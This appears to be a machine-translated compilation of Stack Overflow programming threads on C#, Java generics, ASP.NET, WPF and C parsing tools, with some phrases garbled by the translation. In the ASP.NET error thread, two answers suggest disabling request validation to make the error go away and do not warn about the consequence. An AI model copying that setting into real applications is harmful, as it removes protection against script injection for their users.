            get { return _mgr ?? (_mgr = new Manager(s => PrivateSetter = s)); }
        }
        public string PrivateSetter { get; private set; }
        public Managed()
        {
            PrivateSetter = "Unset";
        }
    }

    public class Manager
    {
        private Action<string> _setPrivateProperty;
        public Manager(Action<string> setter)
        {
            _setPrivateProperty = setter;
        }
        public void SetProperty(string value)
        {
            _setPrivateProperty(value);
        }
    } 
```

以下是我们在 lambda 之前的日子里是如何做到的：

```
public class Managed
{
    private Manager _mgr;
    public Manager Mgr
    {
        get { return _mgr ?? (_mgr = new Manager(this)); }
    }
    public string PrivateSetter { get; private set; }
    public Managed()
    {
        PrivateSetter = "Unset";
    }
    public class Manager
    {
        public void SetProperty(string value)
        {
            m.PrivateSetter = value;
        }
        private Managed m;
        public Manager(Managed man)
        {
            m = man;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-27T12:07:26.673

最好的方法是：

```
/// <summary>
/// Gets or sets foo
/// <b>Setter should only be invoked by SomeClass</b>
/// </summary>    
public Object Foo
{
    get { return foo; }
    set { foo = value; }
} 
```

当您有一些复杂的访问或继承限制，并且执行它需要在代码中过于复杂时，有时最好的方法就是正确地注释它。

但是请注意，如果此限制具有一些安全隐患，则不能依赖此，因为您取决于将使用此代码的开发人员的善意。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-27T11:52:14.507

你不能那样做，但你可以从派生类访问属性的 setter 方法，所以你可以使用继承来达到这个目的。您所要做的就是放置**受保护**的访问修饰符。如果您尝试这样做，那么您的同事是对的:)。您可以尝试这样做：

```
public string Name
{
    get{ return _name; }
    protected set { _name = value; }
} 
```

请记住，该属性的 set 方法只能从派生类访问。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-27T11:54:00.133

或者您可以将这两个类单独放在一个程序集中，并将 setter 作为内部。不过，我会投票支持设计缺陷，除非 milot 先前的回答（继承和保护）是有道理的。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-27T11:57:11.187

你可以这样做：

```
public void setMyProperty(int value, Object caller)
{
    if(caller is MyManagerClass)
    {
        MyProperty = value;
    }
} 
```

这意味着您可以使用调用类中的“this”指针。我会质疑你试图实现的逻辑，但在不知道场景的情况下，我无法提供任何进一步的建议。我要说的是：如果可以重构代码以使其更清晰，那么这样做通常是值得的。

但这很混乱，而且肯定不是万无一失的……您已被警告过！

**或者...**

您可以将具有属性的类（A 类）的委托传递给管理器类（B 类）。委托可以引用 A 中的私有函数，以允许 B 像任何普通函数一样调用该委托。这排除了 A 知道 B 并可能 A 是在 B 之前创建的。再次......混乱而不是万无一失！

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-27T11:53:46.170

您可以通过在“可设置类”中创建一个公共属性来实现这一点，该属性将从具有受保护属性的真实类继承......这样只有继承类可以设置，而不是不继承的类。但缺点是你需要有一个继承类......

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-27T12:32:37.887

反射，虽然我同意这样做只是为了绕过访问修饰符可能表明设计不好。

```
public class Widget
{
   private int count;
   public int Count
   {
      get { return this.count; }
      private set { this.count = value; }
   }
}

public static class WidgetManager
{
    public static void CatastrophicErrorResetWidgetCount( Widget widget )
    {
       Type type = widget.GetType();
       PropertyInfo info = type.GetProperty("Count",BindingFlags.Instance|BindingFlags.NonPublic);
       info.SetValue(widget,0,null);
    }
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-10-27T12:42:33.797

这是一个设计缺陷的原因是因为它似乎混淆了两个对象的范围。

类的属性应该可以在该类的上下文中访问，至少在内部是可访问的。

听起来您的项目类上的可设置属性实际上是管理器类的属性。

您可以通过紧密耦合这两个类来做与您想要的类似的事情：

```
public class MyItem {

    internal MyItemManager manager { get;set; }

    public string Property1 { 
        get { return manager.GetPropertyForItem( this ); } 
    }
} 
```

不幸的是，这也不是很好的设计。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-27T14:06:09.540

您正在寻找的是 C++ 调用的 Friend 类，但 c# 或 vb 都没有此功能。关于这种功能的优点存在很多争论，因为它几乎鼓励类之间非常强的耦合。在 c# 中实现这一点的唯一方法是使用反射。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2013-01-07T16:55:18.347

如果您的目标是让一个类`Foo`让某个属性（例如`Bar`type `Biz`）被某个其他对象更改，而不公开地公开它，那么一种简单的方法是拥有一个`Foo`应该可以被某些人更改的实例其他对象传递另一个对象，`Action<Biz>`该对象指向一个私有方法，该方法更改`Bar`为传入的值。另一个对象可以使用该委托来更改`Bar`提供它的对象的值。

如果希望赋予某种类型`Woozle`的所有实例设置 的`Bar`任何实例的值的能力`Foo`，而不是在每个实例的基础上公开这些能力，则可能需要`Woozle`具有一个公共静态方法`Woozle.InstallFooBarSetter`，该方法采用类型参数`Action<Foo, Biz>`和类型之一`Object`。 `Foo`然后应该有一个静态方法`WoozleRequestBarSetter`，它接受一个`Object`，并将它`Woozle.InstallFooBarSetter`与一个`Action<Foo,Biz>`. 的类初始化程序`Woozle`应该生成一个新的`Object`，并将其传递给`Foo.RequestBarSetter`; 这会将对象`Woozle.InstallFooBarSetter`与委托一起传递给。 `Woozle`然后可以确认传入的对象是它生成的对象，并且 - 如果是这样 - 安装适当的委托。以这种方式做事将确保没有人`Woozle`可以获取委托（因为委托仅传递给`Woozle.InstallFooBarSetter`），并且`Woozle`可以确定其委托来自`Foo`（因为没有其他人可以访问`Woozle`创建的对象，并且`Woozle.InstallFooBarSetter`不会做任何事情没有它）。

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2008-10-27T11:50:48.627

如果它是一个设计缺陷取决于你想要做什么。您可以使用 System.Diagnostics 中的 StackTrace 类来获取设置您的属性的类的类型，然后与您希望允许设置您的属性的类型进行比较..但也许有更好的方法来执行这样的事情（例如拳击）

# java - 用Java中的通用参数覆盖方法？

> ID：239645
> 
> 赞同：44
> 
> 时间：2008-10-27T11:46:57.900
> 
> 标签：java, generics, inheritance

我有一个抽象类**Monitor.java**，它由类**EmailMonitor.java**子类化。

方法：

```
public abstract List<? extends MonitorAccount> performMonitor(List<? extends MonitorAccount> accounts) 
```

在**Monitor.java**中定义并且必须在**EmailMonitor.java**中被覆盖。

我目前在**EmailMonitor.java**中重写了该方法，如下所示：

```
@Override
public List<EmailAccount> performMonitor(List<EmailAccount> emailAccounts) {
    //...unrelated logic
    return emailAccounts;
} 
```

但是，这会产生编译时错误：

`Name clash: The method performMonitor(List<EmailAccount>) of type EmailMonitor has the same erasure as performMonitor(Lis<? extends MonitorAccount> emailAccounts) of type Monitor but does not override it`

`EmailAccount`是 的子类`MonitorAccount`，因此（至少在我看来）以这种方式覆盖它是非常有意义的。看到编译器对我的逻辑不满意，我应该如何正确处理这个问题，同时仍然保持我的编译时间检查以确保所有调用都`EmailMonitor.performMonitor()`接收列表`EmailAccount`而不是其他类型的`MonitorAccount`？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2008-10-27T11:56:23.500

不，它没有正确地覆盖它。覆盖意味着您应该能够处理对基类的任何有效输入。考虑如果客户这样做会发生什么：

```
Monitor x = new EmailMonitor();
List<NonEmailAccount> nonEmailAccounts = ...;
x.performMonitor(nonEmailAccounts); 
```

鉴于您的描述，那里没有任何内容应该给出编译时错误 - 但这显然是错误的。

在我看来`Monitor`，它可以监控的帐户类型应该是通用的，所以你`EmailMonitor`应该扩展`Monitor<EmailAccount>`. 所以：

```
public abtract class Monitor<T extends MonitorAccount>
{
    ...
    public abstract List<? extends T> performMonitor(
        List<? extends T> accounts);
}

public class EmailMonitor extends Monitor<EmailAccount>
{
    @Override
    public abstract List<? extends EmailAccount> performMonitor(
        List<? extends EmailAccount> accounts)
    {
        // Code goes here
    }
} 
```

不过，您可能需要仔细考虑`performMonitor`调用中的泛型 - 返回值意味着什么？

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-27T14:59:27.577

这是我自己的解决方案。我怀疑这与 Jon Skeet 试图达到的目的是一样的……没有错字（请参阅我的评论以回复他的回答）。

**Monitor.java**类：

```
public abstract class Monitor <T extends MonitorAccount> {
  ...
  public abstract List<T> performMonitor(List<T> accounts);
  ..
} 
```

**电子邮件监视器.java**

```
public class EmailMonitor extends Monitor<EmailAccount> {
  ...
  public List<EmailAccount> performMonitor(List<EmailAccount> emailAccounts) {
    ..//logic...logic...logic
    return emailAccounts;
  }
  ...
} 
```

在此配置中，*EmailMonitor.performMonitor()*将始终在编译时检查它是否接收到**EmailAccount**列表，而不是我的任何其他类型的**FTPAccount、DBAccount**等...它比替代方案要干净得多，后者本来可以接收/发送原始列表，然后必须将其强制为所需的类型，从而导致潜在的运行时类型转换异常。

# spring - 如何在activemq中指定TCP传输是服务器模式（监听）还是客户端模式？

> ID：239647
> 
> 赞同：1
> 
> 时间：2008-10-27T11:47:47.510
> 
> 标签：spring, message-queue, activemq, apache-camel, apache-mina

为弹簧注入端点给出的示例如下：

```
<endpoint id="hl7listener" uri="mina:tcp://localhost:8888?sync=true&amp;codec=hl7codec"/> 
```

如何设置客户端模式端点，以便连接到另一台服务器上的特定端口？

如何配置端点以侦听入站连接？（该示例似乎是一个侦听器，如其描述性 ID 所示，但为什么呢？）

注意：我实际上并没有使用 HL7 协议或编解码器。我将为专有协议编解码器开发自己的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-05T08:53:57.773

[这是在这里的线程](http://www.nabble.com/Usage-of-Mina-in-camelContext-for-TCP-loop.-td20348095s22882.html)上回答的吗？

# asp.net - Sys.WebForms.PageRequestManagerServerErrorException 12031

> ID：239669
> 
> 赞同：19
> 
> 时间：2008-10-27T12:05:05.713
> 
> 标签：asp.net, asp.net-ajax, exception-handling

我偶尔会从 AJAX.NET 应用程序中收到以下弹出窗口

```
Sys.WebForms.PageRequestManagerServerErrorException：处理服务器上的请求时发生未知错误。服务器返回的状态码为：12031
```

从[Microsoft kb](http://support.microsoft.com/kb/193625)中，该状态代码指示 ERROR_INTERNET_CONNECTION_RESET，但它没有说明首先触发错误的根本问题是什么。

如何记录/跟踪/等生成弹出窗口的基础错误？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-10-27T12:07:53.973

如果您是从 updatePanel 获取的，请在页面的 ScriptManager 中将 EnablePartialRendering 设置为 false，然后它应该会给出实际错误。

此外，如果它只是偶尔发生，我发现它可能是一个视图状态问题，尤其是当页面在刷新之间经过很长时间（20 分钟左右）时。

否则，请尝试一些 try/catch 块。这些是一些简单的方法。

希望有帮助！

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2009-02-13T11:46:20.567

这是一个视图状态问题，但与时间无关，但与大小有关。尝试在 web.config 中使用 maxRequestLength。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-06-30T13:49:39.660

在更改下拉选择之间的大延迟（> 20 分钟）后，我在 UpdatePanel 中遇到此错误，自动回发下拉。

尝试在 web.cofig 中增加会话超时。例如：

```
<sessionState mode="InProc" cookieless="true" timeout="720"/>; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-16T14:48:29.060

**添加** **web.config** 和`<httpRuntime requestValidationMode="2.0"/>`
YourPage.aspx**设置**(ClientIDMode="Static" ValidateRequest="false")

 ****:::::::::::::::::::::::::::::::::::::::::::::::::: :::::::::::::::::::

示例：web.config

```
 <?xml version="1.0"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  http://go.microsoft.com/fwlink/?LinkId=169433
  -->
<configuration>
  <system.web>
    <httpRuntime requestValidationMode="2.0"/>
    <compilation debug="true" targetFramework="4.0">
      <assemblies>
        <add assembly="System.Data.Entity, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
      </assemblies>
    </compilation>

  </system.web>

  <connectionStrings>
    <add name="WT_ZadnjiEntities" connectionString="metadata=res://*/DAL.Model.csdl|res://*/DAL.Model.ssdl|res://*/DAL.Model.msl;provider=System.Data.SqlClient;provider connection string=&quot;data source=SATELLITE-PC;initial catalog=WT_Zadnji;integrated security=True;multipleactiveresultsets=True;App=EntityFramework&quot;" providerName="System.Data.EntityClient" />
  </connectionStrings>
</configuration> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-01-26T16:07:21.707

如果您添加了服务器 SSL 证书（https），有时会发生错误。如果证书无效，则会出现此错误。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-03-02T00:48:16.067

我在回发时发生以下错误：

> 错误：Sys.WebForms.PageRequestManagerServerErrorException：处理服务器上的请求时发生未知错误。

但对我来说，问题是我正在将我的项目从 ASP.NET 2.0 转换为 ASP.NET 4.0，并且我`<asp:UpdatePanel runat="server">`在页面上使用过。

我取下了`<asp:UpdatePanel runat="server">`（暂时），然后运行页面以获取确切的错误。这是“检测到潜在危险的 Request.Form 值”

我发现即使我`ValidateRequest="false"`在页面上有，ASP.NET 4.0 要求你`requestValidationMode="2.0"`在 web.config 的 HttpRuntime 标签中添加。

```
<httpRuntime maxRequestLength="102400" requestValidationMode="2.0"/> 
```

[参考](http://www.codeproject.com/Tips/297679/A-potentially-dangerous-Request-Form-value-was-det)

# flash - 为嵌入式系统开发基于 flash/flex 的触摸屏用户界面使用什么工具

> ID：239670
> 
> 赞同：1
> 
> 时间：2008-10-27T12:05:46.023
> 
> 标签：flash, embedded

我们正在考虑开发一种带有触摸屏的设备和用于用户界面的嵌入式 PC（如计算机）。

在这个用户界面开发中使用 flash/flex 有什么好处和坏处？

我们的目标之一是将应用程序的设计（=外观和感觉）和功能分开以简化开发。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T12:26:52.347

关于闪存

优点：

*   一应俱全
*   强大的编辑工具
*   很多人都知道怎么用

缺点：

*   （非常）与它所做的相比表现不佳
*   开源实现仍然滞后
*   Adobe Flash 组件的使用受其 EULA 的约束
*   不提供用于嵌入的清晰 API

# c# - 如何仅将数据库的模式获取到数据集中？

> ID：239675
> 
> 赞同：6
> 
> 时间：2008-10-27T12:08:04.380
> 
> 标签：c#, .net, ado.net, dataset

如何仅将表的架构加载到数据集中。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-27T12:12:19.567

[SqlDataAdapter.FillSchema](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqldataadapter.fillschema.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T12:17:16.937

执行一个通常会返回您的数据的查询并添加一个 where 子句，以便不返回任何行。

# windows - 线程排序服务场景

> ID：239677
> 
> 赞同：5
> 
> 时间：2008-10-27T12:09:51.507
> 
> 标签：windows, multithreading, windows-vista, operating-system

阅读新的 Vista/Win2008 功能，我想知道线程排序服务的意义何在。换句话说，在哪种情况下，“经典”调度程序的“对所有人公平”政策是不够的，而明确的线程顺序是可取的？

澄清。可以从中受益的具体应用程序是什么？

不过，谢谢你的回答。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-28T10:52:02.053

线程排序服务在抢占式多线程世界中提供协作多线程。创建组时，您指定组中的线程可以使用的最大时间片（周期 + 超时），以及运行组的频率（周期）。

然后，您的线程将在每个周期内最多运行一次，如果它们超过其最大时间片，则会出现错误。

我想这在有硬响应时间限制的情况下效果很好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T12:21:08.410

线程排序服务并不适用于所有线程，而仅适用于注册到它的线程。您必须*使*您的程序使用该功能。

该服务确保线程以理想的（可配置的）顺序执行。“对所有人公平”的调度程序无法保证这一点。如果您的线程没有首选的执行顺序，则该服务可能不会为您提供额外的价值。

# c# - 为什么我的 C# 组合框中插入了 3 个值而不是 1 个？

> ID：239682
> 
> 赞同：2
> 
> 时间：2008-10-27T12:13:29.830
> 
> 标签：c#

在读取文件名的注册表时，我会为每 1 个注册表条目加载 3 个条目到我的组合框中。如果我在注册表中列出了 1 个文件，我会看到：

组合框值：

c:\file1.txt

<-----此处为空白

c:\file1.txt

我发现问题出在这段代码中，它命中了 'if (previousFiles != null)' 3 次。我应该如何纠正这个？

```
for (int i = 0; i <= 5; i++)
{
    Object previousFiles = OurKey.GetValue("Files" + i);
    if (previousFiles != null)
    {
        comboBox1.Items.Add(previousFiles.ToString());
    }
} 
```

非常感谢星期一早上的忧郁！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T13:28:47.930

好吧，它应该命中 if() 语句 6 次，comboBox1.Items.Add() 语句 3 次。合乎逻辑的解释是，真正的问题在于编写注册表项的代码。运行 Regedit.exe 以找出这些注册表项值中实际存储的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T13:36:51.020

抱歉，它是在编写它的代码中，我正在查看一个旧的 reg 密钥....对不起！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T12:14:57.160

只需添加一个“break;” 在第一个 comboBox1.Items.Add() 之后。它会在插入后离开循环（如果这是你想要的）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T12:18:04.530

看起来问题出在您的 GetValue() 函数中。另外，在添加到组合框之前，您应该检查 null 和空字符串。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T12:19:13.000

假设这是一个字符串值，您可能会看到返回的是一个空字符串；从代码中很难分辨。

因此，不是先进行空检查，而是先转换对象；

```
Object previousFiles = OurKey.GetValue("Files" + i) as string; 
```

然后使用

```
string.IsNullOrEmpty() 
```

而不是普通的空检查。

# c# - C# - 将 PDF 放在另一个 PDF 中

> ID：239685
> 
> 赞同：0
> 
> 时间：2008-10-27T12:15:09.967
> 
> 标签：c#, asp.net, pdf-generation, watermark

我有各种格式的各种公司的多个徽标，需要添加到其他 PDF 中。目前未指定这些徽标的格式，但如果它引起问题，可以将其锁定为仅某些格式。

这些其他 PDF 将主要是海报，并将由用户打印出来。

问题：将这些徽标即时添加到 PDF 海报艺术品上，然后由用户下载和打印的最佳方式是什么？请记住，打印时需要保留 PDF 的原始质量。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T12:25:45.203

请参阅我对[类似问题](https://stackoverflow.com/questions/204860/best-server-side-net-pdf-editing-library)的回答。简而言之，我使用[itextsharp](http://itextsharp.sourceforge.net/)将水印添加到现有 PDF 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T13:06:07.680

[PDFSharp](http://www.pdfsharp.com/PDFsharp/)是一个可以做到这一点的免费库。 [这些水印示例](http://www.pdfsharp.com/PDFsharp/index.php?option=com_content&task=view&id=40&Itemid=51)应该可以帮助您入门。

# c# - 读取属于另一个应用程序的配置文件的最简单方法

> ID：239687
> 
> 赞同：5
> 
> 时间：2008-10-27T12:17:05.080
> 
> 标签：c#, configuration-files

除了使用原始 XML 之外，.NET 中是否有一种简单的方法可以打开和读取属于另一个程序集的配置文件......？我不需要写信，只需从中获取几个值。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-27T12:27:47.040

[这是](http://msdn.microsoft.com/en-us/library/ms224437.aspx)OpenExeConfiguration 上的 MSDN。

编辑：eggheadcafe.com 上的操作指南链接消失了[。](http://www.eggheadcafe.com/software/aspnet/32181042/using-configurationmanage.aspx)看起来 EggheadCafe 已移至 NullSkull，但删除了文章 ID。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T12:21:44.040

你试过[`ConfigurationManager`](http://msdn.microsoft.com/en-us/library/system.configuration.configurationmanager.aspx)吗[`OpenExeConfiguration(path)`](http://msdn.microsoft.com/en-us/library/ms224437.aspx)？（在 System.Configuration.dll 中）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-11-23T02:28:28.223

或者，也许您可​​以将具有 [Serializable()] 属性的简单类序列化到文件中...并在其他应用程序中反序列化...

[http://www.dotnetperls.com/serialize-list](http://www.dotnetperls.com/serialize-list)
[http://msdn.microsoft.com/en-us/library/system.serializableattribute.aspx](http://msdn.microsoft.com/en-us/library/system.serializableattribute.aspx)

示例程序显示了一小段代码序列化到文件和另一个读取文件......

您可以序列化为文件、XML、SOAP...

# wpf - 使用 WPF 时的硬件建议/限制？

> ID：239697
> 
> 赞同：5
> 
> 时间：2008-10-27T12:21:09.673
> 
> 标签：wpf

我的公司刚刚开始考虑使用 WPF 迁移我们所有 10 年历史的业务应用程序。这些应用程序大部分时间将在硬件有限/旧的计算机上运行。我们现在有点担心硬件可能过于受限而无法使用 WPF。

我们已经在一台基本的旧计算机上安装了 Family.Show ( [http://www.vertigo.com/familyshow.aspx](http://www.vertigo.com/familyshow.aspx) )，它似乎运行正常。但是我们想知道您在旧硬件上使用 WPF 的经验是什么？有没有人愿意和我们分享一些经验？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-28T13:46:29.907

我要补充几件事：

1.  首先，正如 Stu 所说，这真的取决于你在做什么。特别是，我们发现 WPF 2D 和 WPF 3D 之间存在显着差异。**如果你正在做任何 WPF 3D 的东西，你的性能在很大程度上取决于视频卡的质量**（请参阅已经提到的[Graphic Rendering Tiers链接）。](http://msdn.microsoft.com/en-gb/library/ms742196.aspx)特别是，我们在今年 4 月发布了 WPF 3D 功能，它确实只在 Tier 2 硬件上运行顺畅。

2.  其次，我会向您介绍 Jossef Goldberg 的[博客](http://blogs.msdn.com/jgoldb/default.aspx)。它有大量关于 WPF 性能相关项目的信息。

3.  第三，我会抓住并利用 WPFPerf 工具。实际上，它们最近已更新。Josef 的博客[文章](http://blogs.msdn.com/jgoldb/archive/2008/09/25/updated-wpfperf-performance-profiling-tools-for-wpf.aspx)也会为您指明正确的方向。

4.  第四，尽可能利用[虚拟化。](http://blogs.msdn.com/jgoldb/archive/2008/03/25/quick-tips-to-improve-wpf-app-memory-footprint.aspx)

5.  最后，我建议在整个开发生命周期中一直监控性能。我认为故事是这样的，最初 Blend 团队直到接近尾声才评估性能（对于他们的第一个版本），这使得解决问题变得更加困难。

**更新：**关于这个主题还有另一个 StackOverflow[帖子。](https://stackoverflow.com/questions/222070/how-to-speed-up-wpf-programs)只是想向其他人指出它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T14:26:16.067

WPF 应用程序的运行速度*通常*不会比使用其他技术的同类应用程序慢。换句话说，性能取决于你在做什么。如果您有一个带有一些简单数据输入控件和一个或两个网格的基本应用程序，那么它的要求将比具有动画自定义控件和叠加视频等的应用程序要求低得多。

您还应该记住，您必须至少拥有 XP SP2 才能安装 WPF，无论如何它设置了一个合理的硬件基线。

总而言之，只要您对这些装饰很敏感，在较旧的硬件上运行 WPF 应用程序应该没有问题。鉴于 WPF 的模板化控件，在运行时测试基本级别的客户端性能也相当简单（请参阅[图形渲染层](http://msdn.microsoft.com/en-gb/library/ms742196.aspx)）并且仅在合适的硬件上启用更高级的功能。

# open-source - 大/流行网站的源代码

> ID：239705
> 
> 赞同：3
> 
> 时间：2008-10-27T12:24:36.610
> 
> 标签：open-source

很高兴在 Web 上找到满足您当前需求的所有这些小代码片段，但是有什么比一次获取整个应用程序源代码并像阅读一本书一样阅读它更好的方法呢？没有更好的方法来学习各种架构解决方案的积极和消极方面。

这就是为什么我试图找到一些已发布源代码的知名/大型网站，但没有找到比我已经知道的更多的东西（[http://code.reddit.com/browser](http://code.reddit.com/browser)）

你还知道什么吗？

PS。只是好奇-您听说过任何非官方的大型网站源代码泄漏吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-27T12:31:42.007

维基百科的源代码 (MediaWiki) 可以在[http://www.mediawiki.org/找到](http://www.mediawiki.org/)

最相关的部分是

*   [“phase3”](http://svn.wikimedia.org/viewvc/mediawiki/trunk/phase3/)（核心代码；这个奇怪的名字是因为它被重写了几次）
*   [扩展](http://svn.wikimedia.org/viewvc/mediawiki/trunk/extensions/)（维基百科使用了其中的几个；哪些可以在[Special:Version](http://en.wikipedia.org/wiki/Special:Version)中看到）

此外，这里是对维基百科整个架构的非常详细的解释：[维基百科：站点内部结构、配置、代码示例和管理问题](http://dammit.lt/uc/workbook2007.pdf)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-27T12:35:42.030

您可以查看 SlashCode，它是 Slashdot 和任何其他将其用作 CMS / 博客解决方案的网站背后的代码。[http://www.slashcode.com](http://www.slashcode.com)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T14:28:26.797

[http://www.koders.com/](http://www.koders.com/)

高温高压

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T12:37:23.680

浏览 SourceForge 存储库正是您想要的。有大量著名的高质量应用程序，例如 Hibernate，举一个重要的例子。所有的源代码都在那里:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T12:49:44.250

查看 Rob Conery 的截屏视频系列[MVC Storefront](http://blog.wekeroad.com/mvc-storefront/)，他在其中使用 ASP.NET MVC 构建了一个小型商务网站。

# c - 来自 C 代码的 AST

> ID：239722
> 
> 赞同：24
> 
> 时间：2008-10-27T12:31:28.920
> 
> 标签：c, abstract-syntax-tree

我想对 C 源代码进行一些转换。**我需要一个在 linux 上从源代码生成完整 AST 的工具，**以便我可以在这个 AST 上应用我的转换，然后将其转换回 C 源代码。我尝试了[ELSA](http://www.cs.berkeley.edu/~smcpeak/elkhound/sources/elsa/)，但它没有被编译。（我使用的是 Ubuntu 8.4）。谁能推荐一个更好的工具/应用程序？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2008-10-30T07:23:55.950

我会推荐[clang](http://clang.llvm.org)。它有一个相当完整的 C 实现，带有大多数 gcc 扩展，并且代码非常易于理解。他们的 C++ 实现是不完整的，但如果你只关心从 C 代码生成 AST 应该没问题。根据您想要做什么，您可以使用 clang 作为库并直接使用 AST，或者让 clang 将它们转储到控制台。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2009-02-14T10:34:30.387

请参阅[pycparser](https://github.com/eliben/pycparser) - 用于 C 的纯 Python AST 生成器。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-27T14:15:48.677

我知道有两个项目对您有用：

*   [CIL](http://www.cs.berkeley.edu/~necula/cil/)
*   [变形金刚](http://www.lrde.epita.fr/cgi-bin/twiki/view/Transformers/)

它们都解析标准 C 源代码以允许进一步分析和转换。我没有使用过它们，所以你必须自己检查它们是否符合你的需要。

当然，使用 GCC 的建议也是有效的。不过，我知道关于 gcc 这方面的文档并不多。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2015-01-07T16:31:24.263

要获得 AST XML 输出，您可以尝试使用MarpaX **::** [Languages::C::AST](https://metacpan.org/pod/MarpaX::Languages::C::AST "MarpaX::语言::C::AST")中的 cscan 。输出将如下所示：

`xml <cscan> <typedef_hash> <typedef id="GLenum" before="unsigned int" after="" file="/usr/include/GL/gl.h"/> ...`

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-07-12T10:12:36.937

Our [DMS Software Reengineering Toolkit](http://www.semdesigns.com/products/DMS/DMSToolkit.html) has been used on huge C systems, parsing, analyzing, transforming, and regenerating C code. Runs on Windows, and will run on Linux under Wine, but it does handle Linux-style (GCC) C code.

I can't emphasize enough the ability to round-trip the C source code: parse, build trees, transform, regenerate compilable C code with the comments and either prettyprinted or with the original programmer's indentation. Few of the other answers here suggest systems that can do that robustly.

The fact that DMS is designed to carry out program transformations (as opposed to other systems suggested in answers here) is also a great advantage. DMS provide tree-pattern matches and rewrites; it augments this with full control and data flow analyis to be used to extend the conditions that you'd like to match. A tool intending to be a compiler is just that, and you'll have a very hard time persuading it not to be a compiler, and an instead to be a transformation engine as the OP requested.

See [https://stackoverflow.com/a/2173477/120163](https://stackoverflow.com/a/2173477/120163) for example ASTs produced by DMS.

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-27T12:58:30.643

www.antlr.org

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-07-12T10:32:34.010

[http://ctool.sourceforge.net/](http://ctool.sourceforge.net/)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-07-12T11:20:09.373

我在源到源转换方面做了少量工作，我发现[CIL](http://manju.cs.berkeley.edu/cil/ "CIL")对于这项任务非常强大。CIL 的优点是是专门为静态源分析和转换而设计的框架。它还可以处理带有任意数量的丑陋 GCC 特定扩展的代码（例如，它被用于处理 Linux 内核。）不幸的是，它是用 OCAML 编写的，使用它构建的分析/转换也必须用 OCAML 编写，如果您从未使用过它，这可能会出现问题。

或者，[clang](http://clang.llvm.org/ "铛")应该有一个相对容易破解的代码库，它当然可以用来生成 C AST。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-27T14:19:47.280

您可以尝试在 Linux 上使用 Lexx 和 Yacc 生成 AST（抽象语法树）：

[lex 和 yacc](http://dinosaur.compilertools.net/)

[从 lex 和 yacc 到 ast](http://www.softwaresecretweapons.com/jspwiki/fromlexyacctoast)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2010-02-19T16:37:15.473

> “我尝试了 ELSA，但它没有被编译。（我使用的是 Ubuntu 8.4）”

来自 scottmcpeak.com/elkhound/ 的 Elkhound 和 Elsa 源代码版本 2005.08.22b 已过时（旧的 C++ 样式 .h 头文件）。

Elsa 正在工作并且是 Oink 的一部分：[http](http://www.cubewano.org/oink/#Gettingthecode) ://www.cubewano.org/oink/#Gettingthecode 我刚刚让它在 Ubuntu 9.10 下工作。

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2008-10-27T12:54:51.820

使用 gcc 并为其编写自定义后端怎么样？我从来没有做过，也没有研究过 gcc 源代码，所以我不知道这有多难。

# c# - 使用 System.Net.WebRequest 时无法设置某些 HTTP 标头

> ID：239725
> 
> 赞同：136
> 
> 时间：2008-10-27T12:32:02.070
> 
> 标签：c#, header, webrequest

当我尝试在对象上添加 HTTP 标头键/值对时`WebRequest`，出现以下异常：

> 必须使用适当的属性修改此标头

